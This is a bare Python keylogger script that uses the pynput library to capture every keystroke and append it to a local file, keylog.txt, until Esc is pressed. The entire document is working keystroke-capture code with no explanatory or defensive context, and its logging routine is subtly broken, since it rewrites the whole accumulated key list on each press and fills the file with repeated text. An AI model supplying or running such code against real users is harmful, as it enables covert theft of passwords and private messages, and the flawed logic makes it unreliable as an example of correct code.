from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))

    write_to_file(keys)

def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            f.write(key)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 